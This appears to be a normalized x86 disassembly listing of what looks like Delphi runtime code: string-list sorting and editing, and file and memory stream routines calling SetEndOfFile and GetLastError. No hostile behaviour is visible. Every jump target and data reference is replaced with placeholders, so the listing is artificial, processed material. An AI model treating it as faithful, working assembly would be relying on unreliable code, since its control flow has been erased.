call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414db8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414dfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404154
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e02
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_414e08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ebc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414368
xor edx edx
push ebp
push sub_414e9f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ea6
mov eax [ ebp - 0x4 ]
call sub_414424
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40404c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414ecc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414f68
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f6f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f80
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_415008
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404144
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042dc
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_414f78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4190cc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4190d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ff5
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419174
inc esi
dec ebx
jne r-xdata
sub_415020
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41503c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4141a0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4049d8
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4150a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41451c
jmp r-xdata
sub_415140
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4049d8
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415180
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ac4
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4151ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41451c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415248
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415248
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41526c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4152e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fb0
pop edi
pop esi
pop ebx
retn
sub_415320
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415348
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41537c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414870
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4153c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41451c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41541c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415348
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fb0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_415494
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41451c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4154f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41451c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415530
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415248
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415530
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4155e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41563c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415530
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415690
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4156c4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415728
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41577c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403174
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
mov esp ebp
pop ebp
retn
sub_4157c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40316c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41577c
pop ecx
mov eax [ ebx ]
call sub_4031b0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41577c
pop ecx
sub_41584c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4158bc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
sub_4158f4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
sub_41592c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4156b0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415a08
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a0f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4158bc
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4158f4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415a20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415a70
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4180d8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a77
mov eax [ ebp - 0x8 ]
call sub_403224
retn
sub_415a80
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_415adc
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4082d4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415b1c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c810
pop ebx
pop ebp
retn 0x8
sub_415b44
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415b88
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_415b88
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415cb1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403530
movzx edx di
mov eax esi
call sub_4081f8
mov ecx eax
xor edx edx
mov eax ebx
call sub_415a80
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408274
mov ecx eax
xor edx edx
mov eax ebx
call sub_415a80
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415cb8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f80
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4083cc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40abe8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4083cc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40abe8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
jmp r-xdata
sub_415cb8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_415cdc
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
call sub_40830c
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_415d18
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415d50
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415d74
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_415da0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_415db8
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4156b0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4158bc
sub_415df0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415d10
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415e18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415df0
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415e44
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406858
xor ecx ecx
